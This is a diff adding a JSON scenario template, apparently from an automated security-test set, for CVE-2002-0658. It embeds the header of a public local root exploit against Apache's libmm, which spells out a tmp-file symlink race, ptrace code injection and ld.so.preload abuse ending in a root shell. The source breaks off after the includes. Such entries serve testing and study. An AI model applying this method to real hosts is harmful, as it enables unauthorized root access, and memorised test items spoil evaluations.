@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_21667",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: MM 1.0.x/1.1.x - Shared Memory Library Temporary File Privilege Escalation (CVE-2002-0658;OSVDB-5150)\n\nExploit source code (21667.c):\n```\n// source: https://www.securityfocus.com/bid/5352/info\n\nThe MM Shared Memory library is reported to be prone to a race condition with regards to temporary files which may enable a local attacker to gain elevated privileges. This issue may reportedly be exploited by an attacker with shell access as the Apache webserver user to gain root privileges on a vulnerable host.\n\n/*** scalpel.c -- local apache/PHP root via libmm (apache-user -> root)\n ***\n *** (C) 2002 Sebastian Krahmer proof of concept exploit.\n ***\n *** Exploiting conditions:\n ***\n *** Apache is linked against libmm which has /tmp races.\n *** Upon Apache start or restart code is executed like\n *** unlink(\"/tmp/session_mm.sem\"); open(\"/tmp/session_mm.sem\", O_RDWR|O_CREAT).\n *** If attacker exploited any CGI or PHP script remotely he gained\n *** apache-user and can go one step further to get root by:\n ***\n *** 1) STOPing all httpd's and bring root to execute /etc/rc.d/apache restart\n ***    Its very likely root does so because webserver just doesnt work anymore\n ***    (all childs are STOPed). One can also send him fake-mail\n ***    from httpd-watchdog that he has to invoke the command.\n *** 2) Install signal-handler and using 2.4 directory notifying to see when\n ***    /tmp/session_mm.sem is unlinked. Create link to /etc/ld.so.preload\n ***    immediately which makes Apache creating that file.\n *** 3) Trigger execution of a CGI script where Apache leaks a descriptor\n ***    (r+w) to /etc/ld.so.preload to the child.\n *** 4) Ptrace that script, inject code which writes content to preload-file.\n *** 5) Execute suid-helper to execute code as root.\n ***\n *** Note in 4) that we cant ptrace httpd alone because it setuid'ed from root\n *** to apache-user thus setting id-changed flag. By triggering execve() of\n *** a CGI script this flag is cleared and we can hijack process.\n ***\n *** assert(must-be-apache-user && must-have-a-cgi-script-installed &&\n ***        must-bring-root-to-restart-apache);\n ***\n ***\n *** wwwrun@liane:~> cc scalpel.c -Wall\n *** wwwrun@liane:~> ./a.out /cgi-bin/genindex.pl\n *** httpd(2368): Operation not permitted\n *** Creating /tmp/boomsh\n *** Creating /tmp/boomso\n *** Installed signal-handler. Waiting for apache restart.\n *** ++++++Forking off proc-scan to attach to CGI-script.\n *** Triggering CGI: /cgi-bin/genindex.pl\n *** Got cgi-bin PID 2460\n *** Injecting of write-code finished.\n *** blub\n *** +sh-2.05# id\n *** uid=0(root) gid=65534(nogroup) groups=65534(nogroup)\n *** sh-2.05#\n ***/\n\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <signal.h>\n#include <sys/stat.h>\n#include <dirent.h>\n#include <sys/types.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/ptrace.h>\n#include <asm/ptrace.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <netdb.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n\n/* Please do not complain about ugly code; its a 1h exploit.\n * For good code see crypto-pty for example ;-)\n */\nint create_link()\n{\n\tsyml\n```",
+  "cve": "CVE-2002-0658;OSVDB-5150",
+  "exploitdb_id": "21667",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_21667",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
